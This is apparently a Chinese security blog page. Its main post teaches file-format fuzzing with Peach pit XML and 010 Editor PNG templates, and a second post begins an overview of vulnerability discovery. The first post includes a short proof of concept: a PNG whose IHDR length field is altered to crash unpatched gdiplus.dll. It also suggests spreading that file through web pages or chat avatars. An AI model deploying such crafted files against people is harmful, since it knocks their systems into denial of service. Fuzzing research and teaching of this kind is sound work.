-                <a class="post-title-link" href="/2017/07/28/文件类型漏洞挖掘与Smart-Fuzz/" itemprop="url">文件类型漏洞挖掘与Smart Fuzz</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-28T22:25:03+08:00">
-                2017-07-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1-Smart-Fuzz"><a href="#1-Smart-Fuzz" class="headerlink" title="1. Smart Fuzz"></a>1. Smart Fuzz</h3><h4 id="1-1-文件格式Fuzz的基本方法"><a href="#1-1-文件格式Fuzz的基本方法" class="headerlink" title="1.1 文件格式Fuzz的基本方法"></a>1.1 文件格式Fuzz的基本方法</h4><p>不管IE还是Office，都有一个共同点，就是用文件作为程序的主要输入。从本质上讲，这些软件都是按照事先约定好的数据结构对文件中不同的数据域进行解析，以决定用什么颜色、在什么位置显示这些数据。</p>
-<p>文件格式Fuzz（File Fuzz）就是利用“畸形文件”测试软件鲁棒性的方法。</p>
-<p>File Fuzz工具的工作流程大体如下：</p>
-<ol>
-<li>以正常的文件模板为基础，按照一定规则生成一批畸形文件</li>
-<li>将畸形文件逐一送入软件进行解析，并监视软件是否会抛出异常</li>
-<li>记录软件产生的错误星系，如寄存器状态、栈状态等</li>
-<li>用日志或其他UI形式向测试人员展示异常信息，以进一步鉴定这些错误是否能被利用</li>
-</ol>
-<p><img src="/images/2017-07-28/file_fuzz.jpg" alt="File Fuzz的一般步骤"></p>
-<h4 id="1-2-Blind-Fuzz和Smart-Fuzz"><a href="#1-2-Blind-Fuzz和Smart-Fuzz" class="headerlink" title="1.2 Blind Fuzz和Smart Fuzz"></a>1.2 Blind Fuzz和Smart Fuzz</h4><p>Blind Fuzz就是“盲测”，也即在随机位置插入随机的数据以生成畸形文件。现代软件往往使用非常复杂的数据结构，而数据结构越复杂，解析逻辑越复杂，就越容易出现漏洞。复杂的数据结构有以下特征：</p>
-<ol>
-<li>拥有一批预定义的静态数据，如magic、cmd id等</li>
-<li>数据结构的内容是可以动态改变的</li>
-<li>数据结构之间是嵌套的 </li>
-<li>数据中存在多种数据关系（size of, point to, reference of, CRC）</li>
-<li>有意义的数据被编码或压缩，甚至用另一种文件形式来存储。</li>
-</ol>
-<p>对于复杂数据结构的复杂文件进行漏洞挖掘，若用Blind Fuzz，则产生测试用例的策略缺少针对性，生成大量无效测试用例，难以发现复杂解析器深层逻辑的漏洞等。</p>
-<p>Smart Fuzz的特征：</p>
-<ol>
-<li>面向逻辑（Logic Oriented Fuzzing）：目标是解析文件的程序逻辑。即明确测试“深度”以及畸形数据的测试“粒度”。</li>
-<li>面向数据类型测试（Data Type Oriented Fuzzing）<ul>
-<li>算术型，以HEX、ASCII、Unicode、Raw格式存在的各种数值</li>
-<li>指针型，Null指针、合法/非法的内存指针等</li>
-<li>字符串型，超长字符串、缺少终止符(0x00)的字符串等</li>
-<li>特殊字符，#,@,*,&lt;,&gt;,/,\,../等</li>
-</ul>
-</li>
-<li>基于样本（Sample Based Fuzzing）：首先构造合法的样本文件（模板文件），然后以这个文件为模板，每次只改动小部分数据和逻辑来生成畸形文件，这也叫做变异（Mutation）</li>
-</ol>
-<h3 id="2-用Peach挖掘文件漏洞"><a href="#2-用Peach挖掘文件漏洞" class="headerlink" title="2. 用Peach挖掘文件漏洞"></a>2. 用Peach挖掘文件漏洞</h3><h4 id="2-1-Peach-介绍与安装"><a href="#2-1-Peach-介绍与安装" class="headerlink" title="2.1 Peach 介绍与安装"></a>2.1 Peach 介绍与安装</h4><p>Peach是一款用Python写的开源Smart Fuzz工具，其支持两种文件Fuzz方法：基于生长(Generation Based)和基于变异(Mutation Based)。基于生长的Fuzz方法产生随机或启发性数据来填充给定的数据模型，从而生成畸形文件。基于变异的Fuzz方法在一个给定的样本文件基础上进行修改从而产生畸形文件。</p>
-<h4 id="2-2-XML介绍"><a href="#2-2-XML介绍" class="headerlink" title="2.2 XML介绍"></a>2.2 XML介绍</h4><p>XML即&quot;Extensible Generalized Markup Language&quot;，可扩展标记性语言；其与HTML一样都是标准通用标记性语言（Standard Generalized Markup Language, SGML）</p>
-<p>XML分为文件序言(Prolog)和文件主体两大部分。文件序言为XML第一行，告诉解析器该如何工作（例如：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;）。其中version是XML文件所用的标准版本号，必须要有：encoding标明此XML文件的编码类型，如果是Unicode编码时则可以省略。文件主体分为以下几个部分：</p>
-<ol>
-<li>元素(Element)：&lt;title&gt; lang=&quot;cn&quot;&gt;XML&lt;/title&gt;</li>
-<li>标签(Tag)：&lt;tile&gt;</li>
-<li>属性(Attribute)：lang就是&lt;title&gt;的属性</li>
-<li>根元素(Root Element)：又称文档元素。起始标签</li>
-<li>注释(Comment)：&lt;!-- --!&gt;来注释</li>
-</ol>
-<h4 id="2-3-定义简单的Peach-Pit"><a href="#2-3-定义简单的Peach-Pit" class="headerlink" title="2.3 定义简单的Peach Pit"></a>2.3 定义简单的Peach Pit</h4><p>Peach Pit文件包括以下5个模块：</p>
-<ol>
-<li>GeneralConf</li>
-<li>DataModel</li>
-<li>StateModel</li>
-<li>Agents and Monitors</li>
-<li>Test and Run Configuration</li>
-</ol>
-<p>所有元素都包含在根元素&lt;Peach&gt;里</p>
-<pre><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
-&lt;Peach xmlns="http://phed.org/2008/Peach" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-        xsi:schemaLocation="http://phed.org/2008/Peach ../peach.xsd" version="1.0"&gt;
-</code></pre>
-
-<p>上面的Peach元素的各个属性基本上是固定的，不要轻易改动</p>
-<p>一、 GeneralConf<br>GeneralConf是Peach Pit文件的第一部分，用来定义基本配置信息。包括:</p>
-<pre><code>* include: 要包含的其他Peach Pit文件
-* Import：要导入的Python库
-* PythonPath：要添加的python库路径
-</code></pre><p>在HelloWorld中，GeneralConf部分只需写入:</p>
-<pre><code>&lt;!-- Import defaults for Peach instance --&gt;
-&lt;Include ns="default" src="file:defaults.xml" /&gt;
-</code></pre>
-
-<p>二、 DataModel<br>DataModel用来定义数据模型，包括数据结构和数据关系等。一个Peach Pit文件中需要包含一个或多个数据类型。常见的有:</p>
-<pre><code>* String：属性有name, size, value, isStatic
-* Number：属性有name, size
-* Blob: 无具体数据类型，属性有name
-* Block： 用于对数据进行分组，属性有name
-</code></pre><p>HelloWorld程序中定义的:</p>
-<pre><code>&lt;!-- Create a simple data template containing a single string --&gt;
-&lt;DataModel name="HelloWorldTemplate"&gt;
-        &lt;String value="Hello World!" /&gt;
-&lt;/DataModel&gt;
-</code></pre>
-
-<p>三、StateModel<br>StateModel用于描述如何向目标程序发送/接收数据。StateModel由至少一个State组成，并且用initialState指定一个State；每个State由至少一个Action组成，Action用于定义StateModel中的各种动作，动作类型由type来指定。Action支持的动作类型包括start、stop、open、close、input、output、call等。</p>
-<p>当代码中有多个Action时，则从上往下依次执行。</p>
-<pre><code>&lt;StateModel name="State" initialState="State1" &gt;
-        &lt;State name="State1"&gt;
-                &lt;Action type="output" &gt;
-                        &lt;DataModel ref="HelloWorldTemplate"/&gt;
-                &lt;/Action&gt;
-        &lt;/State&gt;
-&lt;/StateModel&gt;
-</code></pre>
-
-<p>四、Agent<br>Agent用于定义代理和监视器，可以用来调用Windbg等调试器来检测程序运行的错误信息等，一个Peach Pit文件可以定义多个Agent，每个Agent下可以定义多个Monitor。<br>Monitor类型为debugger.WindowsDebugEngine，是调用Windbg来执行下面的&quot;notepad.exe filename&quot;命令；而若类型为process.PageHeap，则是为notepad.exe开启页堆调试(Page Heap Debug)。</p>
-<p>五、Test and Run configuration<br>Test元素用来定义一个测试的配置，包括一个StateModel和一个Publisher，以及including/execluding、Agent信息等。其中StateModel和Publisher是必须定义的，其他可选。Publisher用来定义Peach的IO连接，可以构造网络数据流(如TCP，UDP，HTTP)和文件流(如FileWriter，FileReader)等</p>
-<p>在HelloWorld程序中，需要的是将畸形数据显示到命令行，所以Publisher用的是标准输出stdout.Stdout</p>
-<pre><code>&lt;Test name="HelloWorldTest"&gt;
-        &lt;StateModel ref="State"/&gt;
-        &lt;!-- Display test cases to the console --&gt;
-        &lt;Publisher class="stdout.Stdout" /&gt;
-&lt;/Test&gt;
-</code></pre>
-
-
-<p>Run元素用来定义要运行哪些测试，包括一个或多个Test，另外还可以通过Logger元素配置日志来捕获运行结果。当然，Logger是可选的</p>
-<p>HelloWorld程序中，run配置如下：</p>
-<pre><code>&lt;!-- Configure a single run --&gt;
-&lt;Run name="DefaultRun" description="Stdout HelloWorld Run"&gt;
-
-        &lt;Test ref="HelloWorldTest" /&gt;
-
-&lt;/Run&gt;
-</code></pre>
-
-
-<h4 id="2-4-定义数据之间的依存关系"><a href="#2-4-定义数据之间的依存关系" class="headerlink" title="2.4 定义数据之间的依存关系"></a>2.4 定义数据之间的依存关系</h4><p>在Peach Pit中可以用Relation元素来表示数据长度、数据个数以及数据偏移等信息。格式如下:</p>
-<pre><code>&lt;Relation type="size" of="Data" /&gt;
-&lt;Relation type="count" of="Data" /&gt;
-&lt;Relation type="offset" of="Data" /&gt;
-</code></pre>
-
-<p>同样，数据校验值也可以通过Fixup来表示。Fixup支持的校验类型包括CRC32、MD5、SHA1、SHA256、EthernetChecksum、SspiAuthentication等，这可参考官方文档。Fixup格式如下:</p>
-<pre><code>&lt;Fixup class="FixupClass"&gt;
-    &lt;Param name="ref" value="Data" /&gt;
-&lt;/Fixup&gt;
-</code></pre>
-
-<p>FixupClass可以为checksum.Crc32Fixup、checksum.SHA256Fixup等。</p>
-<p>Crc32Fixup数据模型示例:</p>
-<table>
-<thead>
-<tr>
-<th>Offset</th>
-<th>Size</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>0x00</td>
-<td>4 bytes</td>
-<td>Length of Data</td>
-</tr>
-<tr>
-<td>0x04</td>
-<td>4 bytes</td>
-<td>Type</td>
-</tr>
-<tr>
-<td>0x08</td>
-<td>Data</td>
-</tr>
-<tr>
-<td>after data</td>
-<td>4 bytes</td>
-<td>CRC of Type and Data</td>
-</tr>
-</tbody>
-</table>
-<p>上面数据模型的实现:</p>
-<pre><code>&lt;DataModel name="HelloData"&gt;
-&lt;Number name="Length" size="32"&gt;
-    &lt;Relation type="size" of="Data"/&gt;
-&lt;/Number&gt;
-&lt;Block name="TypeAndData"&gt;
-    &lt;String name="Type" size="32" /&gt;
-    &lt;Blob name="Data"/&gt;
-&lt;/Block&gt;
-&lt;Number name="CRC" size="32"&gt;
-    &lt;Fixup class="checksums.Crc32Fixup"&gt;
-        &lt;Param name="ref" value="TypeAndData" /&gt;
-    &lt;/Fixup&gt;
-&lt;/Number&gt;
-&lt;/DataModel&gt;
-</code></pre>
-
-<h4 id="2-5-用Peach-Fuzz-PNG文件"><a href="#2-5-用Peach-Fuzz-PNG文件" class="headerlink" title="2.5 用Peach Fuzz PNG文件"></a>2.5 用Peach Fuzz PNG文件</h4><p>首先看看png图片的格式，如图所示:<br><img src="/images/2017-07-28/png.jpg" alt="png文件格式"></p>
-<p>png最前面是8字节PNG签名，十六进制为89 50 4E 0D 0A 1A 0A。随后是若干个数据区块(Chunk)，包括IDHR、IDAT、IEND等。</p>
-<p>png文件Chunk格式</p>
-<table>
-<thead>
-<tr>
-<th>Name</th>
-<th>Size</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Length</td>
-<td>4 bytes</td>
-<td>Length of data field</td>
-</tr>
-<tr>
-<td>Type</td>
-<td>4 bytes</td>
-<td>Chunk type code</td>
-</tr>
-<tr>
-<td>Data</td>
-<td></td>
-<td>Data Bytes</td>
-</tr>
-<tr>
-<td>CRC</td>
-<td>4 bytes</td>
-<td>CRC of type and data</td>
-</tr>
-</tbody>
-</table>
-<p>可以将Chunk的DataModel定义如下:</p>
-<pre><code>&lt;DataModel name="Chunk"&gt;
-&lt;Number name="Length" size="32" signed="false"&gt;
-    &lt;Relation type="size" of="Data"/&gt;
-&lt;/Number&gt;
-&lt;Block name="TypeAndData"&gt;
-    &lt;String name="Type" size="4" /&gt;
-    &lt;Blob name="Data" /&gt;
-&lt;/Block&gt;
-&lt;Number name="CRC" size="32"&gt;
-    &lt;Fixup class="checksums.Crc32Fixup"&gt;
-        &lt;Param name="ref" value="TypeAndData" /&gt;
-    &lt;/Fixup&gt;
-&lt;/Number&gt;
-&lt;/DataModel&gt;
-</code></pre>
-
-<p>PNG简单地认为是由一个PNG签名和若干个结构相同的Chunk组成。在Chunk数据模型之后将PNG文件的DataModel进行如下定义：</p>
-<pre><code>&lt;DataModel name="Png"&gt;
-&lt;Blob name="pngMagic" isStatic="true" valueTyp="hex" value="89 50 4E 47 0D 0A 1A 0A" /&gt;
-&lt;Block ref="Chunk" minOccurs="1" maxOccurs="1024" /&gt;
-&lt;/DataModel&gt;
-</code></pre>
-
-<p>minOccurs=&quot;1&quot; maxOccurs=&quot;1024&quot;表示该区块最少重复1次，最多重复1024次</p>
-<p>然后配置StateModel:第一步修改文件生成畸形文件；第二部需要把文件关闭；第三步需要调用适当的程序打开生成的畸形文件（这里使用pngcheck）。</p>
-<pre><code>&lt;StateModel name="TheState" initialState="Initial"&gt;
-    &lt;State name="Initial"&gt;
-        &lt;!-- Write out our png file --&gt;
-        &lt;Action type="output"&gt;
-            &lt;DataModel ref="Png" /&gt;
-            &lt;!-- This is our sample file to read in --&gt;
-            &lt;Data name="data" fileName="sample.png" /&gt;
-        &lt;/Action&gt;
-    &lt;/State&gt;
-
-    &lt;!-- Close file --&gt;
-    &lt;Action type="close"/&gt;
-
-    &lt;!-- Launch the target process --&gt;
-    &lt;Action type="call" method="D:\tweakpng.exe"&gt;
-        &lt;Param name="png file" type="in"&gt;
-            &lt;DataModel ref="Param" /&gt;
-            &lt;Data name="fileName"&gt;
-                &lt;!-- Name of Fuzzed output file --&gt;
-                &lt;Field name="Value" value="peach.png" /&gt;
-            &lt;/Data&gt;
-        &lt;/Param&gt;
-    &lt;/Action&gt;
-&lt;/StateModel&gt;
-</code></pre>
-
-<p>在call动作中我们引入了&quot;Param&quot;的数据类型，这个数据模型用来存放传达给pngcheck.exe/tweakpng.exe的参数，即畸形文件的文件名。所以&quot;Param&quot;需要包含一个名为&quot;Value&quot;的字符型静态数据。<br>所以需要在StateModel之前定义该数据模型:</p>
-<pre><code>&lt;DataModel name="Param"&gt;
-    &lt;String name="Value" isStatic="true" /&gt;
-&lt;/DataModel&gt;
-</code></pre>
-
-<p>然后在Test元素中配置Publisher信息。这里需要FileWriterLauncher，它能在写完文件后使用call动作启用一个线程。</p>
-<pre><code>&lt;Test name="TheTest"&gt;
-    &lt;StateModel ref="TheState"/&gt;
-    &lt;Publisher class="file.FileWriterLauncher"&gt;
-        &lt;Param name="filename" value="peach.png" /&gt;
-    &lt;/Publisher&gt;
-&lt;/Test&gt;
-</code></pre>
-
-<p>最后在Run信息配置中指定要运行的测试名称</p>
-<pre><code>&lt;Run name="DefaultRun"&gt;
-    &lt;Test ref="TheTest" /&gt;
-&lt;/Run&gt;
-</code></pre>
-
-<p>接下来对png_dumb.xml进行一些改动，让程序调用windows资源管理器打开畸形文件。<br>首先，在StateModel的Action中将tweakpng.exe程序替换为&quot;explorer&quot;<br>然后，在Publisher配置中将class改为file.FileWriterLauncherGui，并且为Publisher增加一个名为WindowName、值为peach.png的参数</p>
-<p>FileWriterLauncherGui与FileWriterLauncher的区别:前者用于运行带界面的GUI程序，并且在运行后会自动关闭窗口标题中含有WindowName的值的GUI窗口。</p>
-<p>为了捕获程序的异常，还需配置Agent and Monitor，调用WinDbg进行测试。</p>
-<p>首先将StateModel中最后一个Action删掉，并添加这一行</p>
-<pre><code>&lt;Action type="call" method="ScoobySnacks" /&gt;
-</code></pre>
-
-<p>然后在StateModel下面加入Agent配置</p>
-<pre><code>&lt;Agent name="LocalAgent"&gt;
-    &lt;Monitor class="debugger.WindowsDebugEngine"&gt;
-        &lt;Param name="CommandLine" value="explorer peach.png"/&gt;
-        &lt;Param name="StartOnCall" value="ScoobySnacks" /&gt;
-    &lt;/Monitor&gt;
-
-    &lt;Monitor class="process.PageHeap"&gt;
-        &lt;Param name="Executable" value="explorer" /&gt;
-    &lt;/Monitor&gt;
-&lt;/Agent&gt;
-</code></pre>
-
-<p>然后在Test配置的第一行加入:</p>
-<pre><code>&lt;Agent ref="LocalAgent" /&gt;
-</code></pre>
-
-<p>并且在Publisher的最后一行加入名为debugger，值为true的参数</p>
-<pre><code>&lt;Param name="debugger" value="true" /&gt;
-</code></pre>
-
-<p>最后在Run配置的Test元素后面加入日志配置:</p>
-<pre><code>&lt;Logger class="logger.Filesystem"&gt;
-    &lt;Param name="path" value="logs" /&gt;
-&lt;/Logger&gt;
-</code></pre>
-
-<p>重新运行Fuzzer，实验效果是Fuzzer程序启动了一个Local Peach Agent，通过该Agent控制WinDbg进行调试并捕获异常事件。</p>
-<font color="#f00"><br>本次实验其实很简单，但是环境一定得按照要求来。<br>windbg 版本为 6.8，是否是x86，抑或是amd64，得与python安装版本一致；<br>python 版本为2.5+，一定是版本2<br>peach 版本为v2.3。该版本能与windbg 6.8兼容，但是不能与6.12兼容。<br></font>
-
-<h3 id="3-010脚本"><a href="#3-010脚本" class="headerlink" title="3. 010脚本"></a>3. 010脚本</h3><h4 id="3-1-010-Editor简介"><a href="#3-1-010-Editor简介" class="headerlink" title="3.1 010 Editor简介"></a>3.1 010 Editor简介</h4><p>010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p>
-<p>以PNG文件解析为例：用010 Editor打开PNG文件，然后通过Templates-&gt;Open Template菜单打开PNGTemplate.bt，按F5键运行脚本，在窗口中选择该PNG文件，就可以看到解析结果。</p>
-<h4 id="3-2-010脚本编写入门"><a href="#3-2-010脚本编写入门" class="headerlink" title="3.2 010脚本编写入门"></a>3.2 010脚本编写入门</h4><p>010 Editor分析脚本与C/C++的结构体定义比较类似。但是其是一个自上而下执行的程序，可以使用if、for、while等语句。</p>
-<pre><code>char header[4];
-int numRecords;
-</code></pre>
-
-<p>意味着文件 首4个字节将会映射到字符数组header中，下4个字节则会映射到整型变量numRecords中，并最终显示在解析结果中。<br>但是也可能有这种情况：需要定义一些变量，但是这些变量并不对应着文件中的任何字节，而仅仅是程序运行中所需要的，这时可用哪个local关键字来定义变量。</p>
-<pre><code>local int i, total=0;
-int RecordCounts[5];
-for(i=0; i&lt;5; i++)
-    total += recordCounts[i];
-double records[total];
-</code></pre>
-
-<p>另外在数据的定义中，可以加上一些附加属性，如格式、颜色、注释等。附加属性用尖括号&lt;&gt;括起来。常用的属性包括：</p>
-<pre><code>&lt;format=hex|decimal|octal|binary, fgcolor=&lt;color&gt;, bgcolor=&lt;color&gt;, comment="&lt;string&gt;", open=true|false|suppress, hidden=true|false, read=&lt;function_name&gt;, write=&lt;function_name&gt; &gt;
-</code></pre>
-
-<p>实例：<br>文件格式示例如图所示:<br><img src="/images/2017-07-28/file_structure.jpg" alt="文件格式"><br>脚本如下：</p>
-<pre><code>struct FILE{
-    struct HEADER{
-        char type[4];
-        int version;
-        int numRecords;
-    } header;
-
-    struct RECORD{
-        int len;
-        char name[20];
-        if(file.header.version == 1)
-            char data[len];
-        if(file.header.version == 2)
-            byte data[len];
-    } record[file.header.numRecords];
-
-} file;
-</code></pre>
-
-<h4 id="3-3-010脚本编写提高——PNG文件解析"><a href="#3-3-010脚本编写提高——PNG文件解析" class="headerlink" title="3.3 010脚本编写提高——PNG文件解析"></a>3.3 010脚本编写提高——PNG文件解析</h4><p>首先定义PNG签名和Chunk两种结构，PNG文件签名：</p>
-<pre><code>const uint64 PNGMAGIC = 0x89504E470D0A1A0AL;
-</code></pre>
-
-<p>然后是PNG的Chunk格式:</p>
-<pre><code>typedef struct{
-    uint32 length;
-    char ctype[4];
-    ubyte data[length];
-    uint32 crc &lt;format=hex&gt;;
-} CHUNK
-</code></pre>
-
-<p>还需定义CHUNK结构体的read函数，以便在显示解析结果时能够给出每个Chunk的名字，显然ctype的值可以作为Chunk的名字。在ctype中，每个字节的第三位还分别标识了该Chunk的一些附加信息：</p>
-<table>
-<thead>
-<tr>
-<th>位置</th>
-<th>1</th>
-<th>0</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>第1字节的第3位</td>
-<td>Ancillary</td>
-<td>Critical</td>
-</tr>
-<tr>
-<td>第2字节的第3位</td>
-<td>Private</td>
-<td>Public</td>
-</tr>
-<tr>
-<td>第3字节的第3位</td>
-<td>ERROR_RESERVED</td>
-<td></td>
-</tr>
-<tr>
-<td>第4字节的第3位</td>
-<td>Safe to Copy</td>
-<td>UnSafe to Copy</td>
-</tr>
-</tbody>
-</table>
-<p>说明:</p>
-<ul>
-<li>Ancillary标识该区块是辅助区块，该区块可有可无；Critical表示该区块是关键区块，这些区块是必须的</li>
-<li>Private表示该区块是不在PNG标准规格(PNG specification)区块中，属于该PNG文件私有，其名称的第二个字母是小写；Public表示该区块属于PNG标准区块，其名称的第二个字母是大写。</li>
-<li>Safe to Copy表示该区块与图像数据无关，可以随意复制到改动过的PNG文件中；Unsafe to Copy表示该区块内容与图像数据息息相关，如果对文件的Critical区块进行了增删改等操作，则该区块也需要进行相应的修改</li>
-</ul>
-<p>于是CHUNK结构定义如下函数：</p>
-<pre><code>string readCHUNK(local CHUNK &c){
-    local string s;
-    s = c.ctype + "  (";
-    s += (c.ctype[0] & 0x20) ? "Ancillary, " : "Critical, ";
-    s += (c.ctype[1] & 0x20) ? "Private, "   : "Public, ";
-    s += (c.ctype[2] & 0x20) ? "ERROR_RESERVED, " : "";
-    s += (c.ctype[3] & 0x20) ? "Safe to Copy)" : "Unsafe to Copy)";
-    return s;
-}
-</code></pre>
-
-<p>同时在定义好的CHUNK结构体后加上read属性，即把“} CHUNK;”改为:</p>
-<pre><code>} CHUNK &lt;read=readCHUNK&gt;
-</code></pre>
-
-<p>最后写入解析&quot;主函数&quot;:</p>
-<pre><code>uint64 pngid &lt;format=hex&gt;;
-
-if(pngid != PNGMAGIC){
-    Warning("Invalid PNG File: Bad Magic Number");
-    return -1;
-}
-
-while(!FEof()){
-    CHUNK chunk;
-}
-</code></pre>
-
-<p>另外，由于PNG文件是按照BigEndian格式进行存储的，所以需要在脚本的第一行加入:</p>
-<pre><code>BigEndian();
-</code></pre>
-
-<p><b>漏洞</b></p>
-<p>实验环境<br>操作系统： Win XP SP3<br>GdiPlus.dll版本： 5.1.3102.5512</p>
-<p>在之前的PNG解析结果中找到IHDR Chunk的length位置，也就是第9-12字节，通常情况下其值为13(0x0D)，现在换成0xFFFFFFF4，并将文件另存为poc.png。<br>在实验环境下打开poc.png，打开资源管理器，会发现explorer.exe的CPU占用率升至100%，使系统接近宕机状态，只有强行结束或者重启explorer.exe进程才能使系统恢复正常。</p>
-<p>实际上gdiplus.dll在处理IHDR时存在整数溢出漏洞。该漏洞的危害：</p>
-<ol>
-<li>打开poc.png或者打开poc.png所在文件夹的未打补丁的用户死机</li>
-<li>将poc.png挂载某网页上，访问该页面的未打补丁用户死机</li>
-<li>设为QQ或MSN头像，查看头像的未打补丁用户死机</li>
-</ol>
-<h4 id="3-4-PPT文件解析"><a href="#3-4-PPT文件解析" class="headerlink" title="3.4 PPT文件解析"></a>3.4 PPT文件解析</h4><p>office系列软件使用的文件格式分为两个：<br>Office97~Office2003：使用基于二进制的文件格式，文件名后缀为doc、ppt、xls等<br>Office2003及更高版本：使用基于XML的文件格式，文件名后缀为docx、pptx、xlsx等。</p>
-<p>本节以PowerPoint97~2003所用的二进制文件格式，PPT文件的解析过程从逻辑上分为如下四层：</p>
-<table>
-<thead>
-<tr>
-<th>测试深度</th>
-<th>解析逻辑</th>
-<th>数据粒度</th>
-<th>Fuzz方法</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Level1</td>
-<td>OLE2 解析器</td>
-<td>离散分布的512字节数据段</td>
-<td>修改OLE文件头、FAT区块、目录区块等位置的数据结构</td>
-</tr>
-<tr>
-<td>Level2</td>
-<td>PPT 记录解析器</td>
-<td>流和信息库</td>
-<td>修改流中的数据，破坏记录头和数据的关系</td>
-</tr>
-<tr>
-<td>Level3</td>
-<td>PPT 对象创建器</td>
-<td>原子和容器</td>
-<td>用负载替换原子数据</td>
-</tr>
-<tr>
-<td>Level4</td>
-<td>PPT 对象内部逻辑</td>
-<td>原子记录内部的integer、bool、string等类型数据</td>
-<td>用相关的负载修改字节数据</td>
-</tr>
-</tbody>
-</table>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/28/漏洞挖掘技术简介/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/28/漏洞挖掘技术简介/" itemprop="url">漏洞挖掘技术简介</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-28T13:58:56+08:00">
-                2017-07-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1-漏洞挖掘概述"><a href="#1-漏洞挖掘概述" class="headerlink" title="1. 漏洞挖掘概述"></a>1. 漏洞挖掘概述</h3><h4 id="1-1-Fuzz测试"><a href="#1-1-Fuzz测试" class="headerlink" title="1.1 Fuzz测试"></a>1.1 Fuzz测试</h4><p>这是一种黑盒测试，与基于功能性的测试有所不同，Fuzz主要目的是&quot;crash&quot;、&quot;break&quot;、&quot;destroy&quot;。</p>
-<p>Fuzz的测试用例往往是带有攻击性的畸形数据，用以触发各种类型的漏洞。</p>
-<p>Fuzz测试的优点：很少出现误报，能够快速找到真正的漏洞<br>Fuzz测试的缺点：永远不能保证系统中已经没有漏洞</p>
-<h4 id="1-2-学术界与工业界的区别"><a href="#1-2-学术界与工业界的区别" class="headerlink" title="1.2 学术界与工业界的区别"></a>1.2 学术界与工业界的区别</h4><p>学术界偏向于<font color="#f00">对源代码进行静态分析</font>，直接在程序的逻辑上寻找漏洞。方法和理论有：(可追溯于1976年在ACM Computing Surveys上的论文Data Flow Analysis Software Reliability)</p>
-<ul>
-<li>数据流分析</li>
-<li>类型验证系统</li>
-<li>边界检验系统</li>
-<li>状态机系统等</li>
-</ul>
-<h4 id="1-3-审计源代码的工具"><a href="#1-3-审计源代码的工具" class="headerlink" title="1.3 审计源代码的工具"></a>1.3 审计源代码的工具</h4><ol>
-<li>Fortify在编译阶段扫描若干安全风险</li>
-<li>Rough Auditing Tool for Security(RATS)用于分析C/C++语言的语法树，寻找存在潜在安全问题的函数调用</li>
-<li>BEAM(Bugs Errors And Mistakes)，IBM的静态代码分析工具，使用数据楼分析的方法，分析源代码的所有可执行路径，以检测代码中潜在的bug</li>
-<li>SLAM用于检测驱动中的bug</li>
-<li>Flaw Finder用Python语言开发的代码分析工具</li>
-<li>Prexis可审计多种语言的源代码，审计的漏洞类型超过30种</li>
-</ol>
